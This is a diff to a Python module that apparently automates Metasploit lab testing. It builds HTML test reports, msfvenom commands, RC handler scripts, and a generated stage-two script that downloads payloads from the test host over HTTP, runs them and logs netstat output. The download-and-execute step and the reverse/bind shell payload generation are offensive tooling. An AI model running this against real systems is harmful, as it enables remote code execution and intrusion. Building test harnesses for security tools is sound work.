@@ -42,11 +42,12 @@ def loadJson(fileName):
 
 def makeHtmlReport(targetData, msfHosts):
     htmlString = "<html>\n<head>\n<title>\n\tTEST RESULTS\n</title>\n</head>\n\n<body>\n"
-    htmlString = htmlString + "<table border=\"1\">\n<tr><td>MSF_HOST NAME</td><td>MSF_HOST IP</td><td>MSF COMMIT VERSION</td></tr>\n"
+    htmlString = htmlString + "<table border=\"1\">\n<tr><td>MSF_HOST NAME</td><td>MSF_HOST IP</td><td>MSF COMMIT VERSION</td><td>PCAP</td></tr>\n"
     for msfHost in msfHosts:
-        htmlString = htmlString + "<tr><td>" + msfHost['NAME'] + "</td><td>" + msfHost['IP_ADDRESS'] + "</td><td>" + msfHost['COMMIT_VERSION'] + "</td></tr>\n"
+        pcapLink = "<a href=" + msfHost['LOCAL_PCAP'] + ">PCAP FILE</a>"
+        htmlString = htmlString + "<tr><td>" + msfHost['NAME'] + "</td><td>" + msfHost['IP_ADDRESS'] + "</td><td>" + msfHost['COMMIT_VERSION'] + "</td><td>" + pcapLink + "</td></tr>\n"
     htmlString = htmlString + "</table>\n"
-    htmlString = htmlString + "<table border=\"1\">\n<tr><td>TARGET</td><td>TYPE</td><td>MSF_HOST</td><td>EXPLOIT</td><td>PAYLOAD</td><td>STATUS</td><td>SESSION</td></tr>\n"
+    htmlString = htmlString + "<table border=\"1\">\n<tr><td>TARGET</td><td>TYPE</td><td>MSF_HOST</td><td>MODULE</td><td>PAYLOAD</td><td>STATUS</td><td>SESSION</td></tr>\n"
     passedString = "<td bgcolor = \"#00cc00\">PASSED</td>"
     failedString = "<td bgcolor = \"#cc0000\">FAILED</td>"
     for host in targetData:
@@ -54,14 +55,22 @@ def makeHtmlReport(targetData, msfHosts):
         if 'STAGE_TWO_FILENAME' in host:
             stageTwoFileName = host['STAGE_TWO_FILENAME']
         for sessionData in host['SESSION_DATASETS']:
-            payloadFileName = "NONE?"
-            if 'FILENAME' in sessionData['PAYLOAD']:
-                payloadFileName = sessionData['PAYLOAD']['FILENAME']
+            payloadFileName = "NO PAYLOAD FILE"
+            payloadName = "NO PAYLOAD (AUX?)"
+            if 'PAYLOAD' in sessionData:
+                payloadName = sessionData['PAYLOAD']['NAME'].lower()
+                if 'FILENAME' in sessionData['PAYLOAD']:
+                    payloadFileName = sessionData['PAYLOAD']['FILENAME']
+                interpreter = ""
+                if 'java' in payloadName:
+                    interpreter = "<br>" + host['METERPRETER_JAVA']
+                if 'python' in payloadName:
+                    interpreter = "<br>" + host['METERPRETER_PYTHON']
             htmlString = htmlString + "<tr><td>" + host['NAME'] + "<br>" + host['IP_ADDRESS'] + "</td>" + \
                                     "<td>" + host['TYPE'] + "</td>" + \
                                     "<td>" + sessionData['MSF_HOST']['NAME'] + "<br>" + sessionData['MSF_HOST']['IP_ADDRESS'] + "</td>" + \
-                                    "<td>" + sessionData['EXPLOIT']['NAME'] + "</td>" + \
-                                    "<td>" + sessionData['PAYLOAD']['NAME'] + "<br>" + payloadFileName + "</td>"
+                                    "<td>" + sessionData['MODULE']['NAME'] + "</td>" + \
+                                    "<td>" + payloadName + "<br>" + payloadFileName + interpreter + "</td>"
             if 'STATUS' in sessionData:
                 if sessionData['STATUS']:
                     htmlString = htmlString + "<td bgcolor = \"#00cc00\">PASSED</td>\n"
@@ -100,7 +109,7 @@ def makeVenomCmd(targetData, sessionData, portTracker, logFile):
     msfVenomCmd = "./msfvenom -p " + payloadData['NAME'] + execFormat + " -o " + payloadData['FILENAME']
     # ADD HOST DATA
     if 'bind' in payloadType.lower():
-        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " RPORT=" + str(payloadData['PRIMARY_PORT'])
+        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
     else:
         msfVenomCmd = msfVenomCmd + " LHOST=" + msfHostData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
     for settingEntry in payloadData['SETTINGS']:
@@ -109,32 +118,39 @@ def makeVenomCmd(targetData, sessionData, portTracker, logFile):
     return msfVenomCmd
 
 def makeRcScript(cmdList, targetData, sessionData, logFile):
+    if 'PAYLOAD' in sessionData:
+        payloadName = sessionData['PAYLOAD']['NAME']
+    else:
+        payloadName = "NONE"
     rcScriptContent =   "# HANDLER SCRIPT FOR \n" + \
-                    "# EXPLOIT:  " + sessionData['EXPLOIT']['NAME'] + "\n" + \
-                    "# PAYLOAD:  " + sessionData['PAYLOAD']['NAME'] + "\n" + \
+                    "# MODULE:  " + sessionData['MODULE']['NAME'] + "\n" + \
+                    "# PAYLOAD:  " + payloadName + "\n" + \
                     "# TARGET:   " + targetData['NAME'] + ' [' + targetData['IP_ADDRESS'] +"]\n" + \
                     "# MSF HOST: " + sessionData['MSF_HOST']['IP_ADDRESS'] + "\n"
     rcScriptName = sessionData['RC_IN_SCRIPT_NAME']
     rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
     rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
     rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
-    rcScriptContent = rcScriptContent + "echo 'use " + sessionData['EXPLOIT']['NAME'] + " ' > " + rcScriptName + "\n"
-    if sessionData['EXPLOIT']['NAME'] != 'exploit/multi/handler':
+    rcScriptContent = rcScriptContent + "echo 'use " + sessionData['MODULE']['NAME'] + " ' > " + rcScriptName + "\n"
+    if sessionData['MODULE']['NAME'] != 'exploit/multi/handler':
+        #THIS IS TERRIBLE, AND I WISH WE DID NOT HAVE TO DO THIS
         rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
-    for settingItem in sessionData['EXPLOIT']['SETTINGS']:
+        rcScriptContent = rcScriptContent + "echo 'set RHOSTS " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
+    for settingItem in sessionData['MODULE']['SETTINGS']:
         rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
-    rcScriptContent = rcScriptContent + "echo 'set payload " + sessionData['PAYLOAD']['NAME'] +"' >> " + rcScriptName + '\n'
-    for settingItem in sessionData['PAYLOAD']['SETTINGS']:
-        rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
-    if 'bind' in sessionData['PAYLOAD']['NAME']:
-        rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
-        rcScriptContent = rcScriptContent + "echo 'set RPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
-    if 'reverse' in sessionData['PAYLOAD']['NAME']:
-        rcScriptContent = rcScriptContent + "echo 'set LHOST " + sessionData['MSF_HOST']['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
-        rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
-    for settingEntry in sessionData['PAYLOAD']['SETTINGS']:
+    for settingEntry in sessionData['MODULE']['SETTINGS']:
         if '=' in settingEntry:
             strSetting = "SET " + settingEntry.split('=')[0] + " " + settingEntry.split('=')[1]
+    if 'PAYLOAD' in sessionData:
+        rcScriptContent = rcScriptContent + "echo 'set payload " + sessionData['PAYLOAD']['NAME'] +"' >> " + rcScriptName + '\n'
+        for settingItem in sessionData['PAYLOAD']['SETTINGS']:
+            rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
+        if 'bind' in sessionData['PAYLOAD']['NAME']:
+            rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
+            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
+        if 'reverse' in sessionData['PAYLOAD']['NAME']:
+            rcScriptContent = rcScriptContent + "echo 'set LHOST " + sessionData['MSF_HOST']['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
+            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
     rcScriptContent = rcScriptContent + "echo 'show options' >> " + rcScriptName + '\n'
     rcScriptContent = rcScriptContent + rubySleep
     rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
@@ -166,42 +182,67 @@ def makeStageTwoShScript(targetData, payloadPort):
             stageTwoShContent = stageTwoShContent + "./" + payloadData.payloadName + "&\n"
     return stageTwoShContent
 
-def makeStageTwoPyScript(targetData, httpPort):
+def makeStageTwoPyScript(targetData, httpPort, remoteLogFile, terminationToken):
     stageTwoPyContent = "# AUTOGENERATED TEST SCRIPT \n"
     stageTwoPyContent = stageTwoPyContent + "import subprocess\n"
     stageTwoPyContent = stageTwoPyContent + "import time\n"
-    stageTwoPyContent = stageTwoPyContent + "import tempfile\n"
-    stageTwoPyContent = stageTwoPyContent + "import urllib\n\n"
-    
-    """
-    functionally, we need to create the following code for each payload:
-    Download it
-      url = 'http://<devVmIp>:<httpPort>/<payloadName>'
-      filename = '<payloadName>'
-      urllib.urlretrieve(url, filename)
-    execute it
-    """
+    stageTwoPyContent = stageTwoPyContent + "import urllib\n"
+    stageTwoPyContent = stageTwoPyContent + "\n"
+    stageTwoPyContent = stageTwoPyContent + "def logError(logFile, logMessage):\n"
+    stageTwoPyContent = stageTwoPyContent + "  try:\n"
+    stageTwoPyContent = stageTwoPyContent + "    fileObj = open(logFile, 'a')\n"
+    stageTwoPyContent = stageTwoPyContent + "    fileObj.write(logMessage)\n"
+    stageTwoPyContent = stageTwoPyContent + "    fileObj.close()\n"
+    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
+    stageTwoPyContent = stageTwoPyContent + "    print 'logError Failed: ' + str(e) + '\\n'\n"
+    stageTwoPyContent = stageTwoPyContent + "    return False\n"
+    stageTwoPyContent = stageTwoPyContent + "  return True\n"
+    stageTwoPyContent = stageTwoPyContent + "\n"
+    stageTwoPyContent = stageTwoPyContent + "def getPayload(url, localName, logFile):\n"
+    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'DOWNLOADING ' + url + '\\n')\n"
+    stageTwoPyContent = stageTwoPyContent + "  try:\n"
+    stageTwoPyContent = stageTwoPyContent + "    urllib.urlretrieve(url, localName)\n"
+    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
+    stageTwoPyContent = stageTwoPyContent + "    logError(logFile, 'FAILED TO GET ' + url + ':\\n' + str(e) + '\\n')\n"
+    stageTwoPyContent = stageTwoPyContent + "    return False\n"
+    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'DOWNLOADED ' + url + '\\n')\n"
+    stageTwoPyContent = stageTwoPyContent + "  return True\n"
+    stageTwoPyContent = stageTwoPyContent + "\n"
+    stageTwoPyContent = stageTwoPyContent + "def runCommand(cmdList, getOutput, logFile):\n"
+    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'LAUNCHING ' + ' '.join(cmdList) + '\\n')\n"
+    stageTwoPyContent = stageTwoPyContent + "  try:\n"
+    stageTwoPyContent = stageTwoPyContent + "    payloadProcess = subprocess.Popen(cmdList, stdout = subprocess.PIPE, stderr = subprocess.PIPE)\n"
+    stageTwoPyContent = stageTwoPyContent + "  except Exception as e:\n"
+    stageTwoPyContent = stageTwoPyContent + "    logError(logFile, 'FAILED TO RUN ' + ' '.join(cmdList) + ':\\n' + str(e) +'\\n')\n"
+    stageTwoPyContent = stageTwoPyContent + "    return False\n"
+    stageTwoPyContent = stageTwoPyContent + "  logError(logFile, 'LAUNCHED ' + ' '.join(cmdList) + '\\n')\n"
+    stageTwoPyContent = stageTwoPyContent + "  time.sleep(5)\n"
+    stageTwoPyContent = stageTwoPyContent + "  if getOutput:\n"
+    stageTwoPyContent = stageTwoPyContent + "    return payloadProcess.communicate()\n"
+    stageTwoPyContent = stageTwoPyContent + "  return True\n"
+    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', 'TESTING\\n')\n"
+    stageTwoPyContent = stageTwoPyContent + "\n"
+
     for sessionData in targetData['SESSION_DATASETS']:
-        msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
-        payloadFile = sessionData['PAYLOAD']['FILENAME']
-        stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
-        stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
-        if '.py' in payloadFile:
-            stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['PYTHON_PATH'] +"', fileName]\n"
-        elif 'jar' in payloadFile:
-            stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['JAVA_PATH'] + "','-jar', fileName]\n"
-        else:
-            stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
-        stageTwoPyContent = stageTwoPyContent + "try:\n"
-        stageTwoPyContent = stageTwoPyContent + "  urllib.urlretrieve(url, fileName)\n"
-        stageTwoPyContent = stageTwoPyContent + "  subprocess.Popen(cmdList)\n"
-        stageTwoPyContent = stageTwoPyContent + "except IOError as ioexep:\n"
-        stageTwoPyContent = stageTwoPyContent + "  print 'Error when launching ' + str(cmdList), ioexep\n"
-        stageTwoPyContent = stageTwoPyContent + "except WindowsError as winerr:\n"
-        stageTwoPyContent = stageTwoPyContent + "  print 'Error when launching ' + str(cmdList), winerr\n"
-        stageTwoPyContent = stageTwoPyContent + "except:\n"
-        stageTwoPyContent = stageTwoPyContent + "  print 'God only knows what happened'\n"
-        stageTwoPyContent = stageTwoPyContent + "time.sleep(5)\n"
+        if 'PAYLOAD' in sessionData and sessionData['MODULE']['NAME'].lower() == "exploit/multi/handler":
+            msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
+            payloadFile = sessionData['PAYLOAD']['FILENAME']
+            stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
+            stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
+            if '.py' in payloadFile:
+                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_PYTHON'] +"', fileName]\n"
+            elif 'jar' in payloadFile:
+                stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['METERPRETER_JAVA'] + "','-jar', fileName]\n"
+            else:
+                stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
+        stageTwoPyContent = stageTwoPyContent + "getPayload(url, fileName, r'" + remoteLogFile + "')\n"
+        stageTwoPyContent = stageTwoPyContent + "runCommand(cmdList, False, r'" + remoteLogFile + "')\n"
+        stageTwoPyContent = stageTwoPyContent + "cmdList = ['netstat',  '-ant']\n"
+        stageTwoPyContent = stageTwoPyContent + "netstatResults = runCommand(cmdList, True, r'" + remoteLogFile + "')\n"
+    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', str(netstatResults[0]))\n"
+    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "', str(netstatResults[1]))\n"
+    stageTwoPyContent = stageTwoPyContent + "logError(r'" + remoteLogFile + "','" + terminationToken + "\\n')\n"
+
     return stageTwoPyContent
 
 def getListFromFile(fileName):
@@ -228,7 +269,6 @@ def logMsg(logFile, strMsg):
     except IOError:
         return False
     return True
-  
     
 def selectVms(vmList, posFilter=None):
     menuVms = []
